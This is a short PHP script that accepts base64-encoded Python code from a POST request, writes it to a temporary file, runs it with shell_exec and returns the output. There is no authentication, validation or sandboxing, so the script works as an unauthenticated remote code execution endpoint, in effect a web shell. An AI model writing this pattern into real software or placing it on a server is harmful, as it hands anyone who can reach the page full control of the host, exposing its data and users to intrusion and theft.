<?php
if (isset($_POST['code'])) {
    $code_b64 = $_POST['code'];
    $code = base64_decode ($code_b64);
    $file = fopen("/tmp/code.py", "w"); 
    fwrite($file , $code); //->__toString()
    fclose($file );
    $output = shell_exec('python /tmp/code.py 2>&1');
    echo "$ python /tmp/code.py\n".$output;
} 
?>